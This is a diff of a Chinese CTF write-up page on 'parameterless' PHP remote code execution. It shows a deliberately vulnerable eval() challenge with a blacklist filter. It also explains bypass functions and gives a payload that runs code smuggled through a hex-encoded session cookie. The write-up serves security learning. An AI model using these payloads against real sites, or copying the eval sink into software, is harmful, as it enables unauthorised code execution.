@@ -17,19 +17,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>WP：无参数REC - bug_001</title>
+  <title>bug_001</title>
 
   
     <meta name="description" content="代码123456789if(isset($_GET[&#x27;c&#x27;]))&#123;    $c &#x3D; $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,">
 <meta property="og:type" content="website">
-<meta property="og:title" content="无参数REC">
+<meta property="og:title" content="bug_001">
 <meta property="og:url" content="https://cbbzx12.github.io/wiki/WP/REC/%E6%97%A0%E5%8F%82%E6%95%B0REC/">
 <meta property="og:site_name" content="bug_001">
 <meta property="og:description" content="代码123456789if(isset($_GET[&#x27;c&#x27;]))&#123;    $c &#x3D; $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cbbzx12.github.io/images/head.jpg">
-<meta property="article:published_time" content="2025-12-23T07:42:12.841Z">
-<meta property="article:modified_time" content="2025-12-23T07:42:12.841Z">
+<meta property="article:published_time" content="2025-12-23T11:43:58.765Z">
+<meta property="article:modified_time" content="2025-12-23T11:43:58.765Z">
 <meta property="article:author" content="bug_001">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cbbzx12.github.io/images/head.jpg">
@@ -48,7 +48,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/WP/REC/%E6%97%A0%E5%8F%82%E6%95%B0REC/","author":{"@type":"Person","name":"bug_001","sameAs":[],"image":"/images/head.jpg"},"name":"无参数REC","description":"代码123456789if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;...","url":"https://cbbzx12.github.io/wiki/WP/REC/%E6%97%A0%E5%8F%82%E6%95%B0REC/"}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/WP/REC/%E6%97%A0%E5%8F%82%E6%95%B0REC/","author":{"@type":"Person","name":"bug_001","sameAs":[],"image":"/images/head.jpg"},"name":"bug_001","description":"代码123456789if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;...","url":"https://cbbzx12.github.io/wiki/WP/REC/%E6%97%A0%E5%8F%82%E6%95%B0REC/"}</script>
   
 <!-- hexo injector head_end start -->
 <style>
@@ -99,8 +99,12 @@
     border-radius: 16px !important; 
   }
 
+
   /* SIDEBAR EXCEPTION: Remove individual card backgrounds inside the glass sidebar */
-  .l_left .widget-wrapper {
+  .l_left .widget-wrapper,
+  .l_left .header, 
+  .l_left .nav-area, 
+  .l_left .footer {
     background: transparent !important;
     border: none !important;
     box-shadow: none !important;
@@ -127,8 +131,6 @@
 <!-- hexo injector head_end end --></head>
 <body><div class="sitebg"><div class="siteblur"></div></div>
 
-
-
 <div class="l_body content" id="start" layout="page" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
 
 
@@ -136,13 +138,12 @@
 
 <div class="nav-area">
 
-<nav class="menu dis-select"><a class="nav-item" title="博客" href="/" style="color:#1BCDFC"><img no-lazy src="https://api.iconify.design/solar/home-2-bold-duotone.svg?color=%231BCDFC" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item active" title="文档" href="/wiki/" style="color:#3DC550"><img no-lazy src="https://api.iconify.design/solar/notebook-bookmark-bold-duotone.svg?color=%233DC550" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><img no-lazy src="https://api.iconify.design/solar/planet-bold-duotone.svg?color=%23FA6400" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><img no-lazy src="https://api.iconify.design/solar/users-group-two-rounded-bold-duotone.svg?color=%23F44336" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a></nav>
+<nav class="menu dis-select"><a class="nav-item" title="博客" href="/" style="color:#1BCDFC"><img no-lazy src="https://api.iconify.design/solar/home-2-bold-duotone.svg?color=%231BCDFC" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><img no-lazy src="https://api.iconify.design/solar/notebook-bookmark-bold-duotone.svg?color=%233DC550" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><img no-lazy src="https://api.iconify.design/solar/planet-bold-duotone.svg?color=%23FA6400" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><img no-lazy src="https://api.iconify.design/solar/users-group-two-rounded-bold-duotone.svg?color=%23F44336" / onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a></nav>
 </div>
 <div class="widgets">
-<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/WP/" placeholder="在 /wiki/WP/ 中搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
-
-
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/12/23/%E6%9C%AC%E7%AB%99%E6%8C%87%E5%8D%97%EF%BC%9A%E5%85%B3%E4%BA%8E%E8%BF%99%E9%87%8C%E7%9A%84%E8%AE%B0%E5%BD%95/"><span class="title">本站指南：关于这里的记录</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
@@ -156,17 +157,9 @@
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 
   <span class="sep"></span>
-  <a class="cap breadcrumb" href="/wiki/WP/REC/%E6%97%A0%E5%8F%82%E6%95%B0REC/">无参数REC</a>
+  <a class="cap breadcrumb" href="/wiki/WP/REC/%E6%97%A0%E5%8F%82%E6%95%B0REC/"></a>
   </div>
-<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-23T07:42:12.841Z">2025-12-23</time></span></div></div></div>
-    
-    <div class="bottom only-title">
-      
-      <div class="text-area">
-        <h1 class="text title"><span>无参数REC</span></h1>
-        
-      </div>
-    </div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-12-23T11:43:58.765Z">2025-12-23</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-12-23T11:43:58.765Z">2025-12-23</time></span></div></div></div>
     
   </div>
   </div><article class="md-text content"><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
@@ -190,12 +183,6 @@
 <h3 id="读取目录"><a href="#读取目录" class="headerlink" title="读取目录"></a>读取目录</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">getallheaders</span>()：返回所有的HTTP头信息，返回的是数组⽽<span class="keyword">eval</span>要求为字符串，所以要⽤impl</span><br><span class="line"><span class="title function_ invoke__">ode</span>()函数将数组转换为字符串</span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>()：该函数的作⽤是获取所有的已定义变量，返回值也是数组，不过是⼆维数</span><br><span class="line">组，⽤<span class="title function_ invoke__">var_dump</span>()输出可以看⻅输出的内容，看⻅在第⼏位之后，可以⽤<span class="title function_ invoke__">current</span>()函数来获取其</span><br><span class="line">值，详细可以看官⽅函数。payload：<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>()));</span><br><span class="line"><span class="title function_ invoke__">session_id</span>()：<span class="title function_ invoke__">session_id</span>()可以⽤来获取/设置当前会话 ID，可以⽤这个函数来获取cookie</span><br><span class="line">中的phpsessionid，并且这个值我们是可控的。</span><br><span class="line"> 如可以在cookie中设置 PHPSESSID=<span class="number">706870696e666</span>f28293b，然后⽤<span class="title function_ invoke__">hex2bin</span>()函数，</span><br><span class="line">即传⼊?exp=<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()))); 并设置cookie：PHP</span><br><span class="line">SESSID=<span class="number">706870696e666</span>f28293b</span><br><span class="line"> session_start 函数是为了开启session</span><br><span class="line"></span><br><span class="line">配合使⽤的函数：</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(‘.’)); 查看当前⽬录下的所有⽂件名</span><br><span class="line"> <span class="title function_ invoke__">var_dump</span>()</span><br><span class="line"><span class="title function_ invoke__">localeconv</span>() 函数返回⼀包含本地数字及货币格式信息的数组。</span><br><span class="line"><span class="title function_ invoke__">current</span>() 函数返回数组中的当前元素（单元）,默认取第⼀个值，pos是current的别名</span><br><span class="line"><span class="title function_ invoke__">each</span>() 返回数组中当前的键/值对并将数组指针向前移动⼀步</span><br><span class="line"><span class="title function_ invoke__">end</span>() 将数组的内部指针指向最后⼀个单元</span><br><span class="line"><span class="title function_ invoke__">next</span>() 将数组中的内部指针向前移动⼀位</span><br><span class="line"><span class="title function_ invoke__">prev</span>() 将数组中的内部指针倒回⼀位</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>() 以相反的元素顺序返回数组</span><br></pre></td></tr></table></figure>
 
 </article>
-<div class="article-footer">
-
-</div>
-
-
-
 
 
 
@@ -203,8 +190,6 @@
 </div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
 <div class="widgets">
-
-
 
 <widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81"><span class="toc-text">代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-text">常见绕过姿势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload1"><span class="toc-text">payload1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A"><span class="toc-text">解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload2"><span class="toc-text">payload2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-1"><span class="toc-text">解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload3"><span class="toc-text">payload3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E7%9B%AE%E5%BD%95"><span class="toc-text">读取目录</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
 </div></aside><div class='float-panel'>
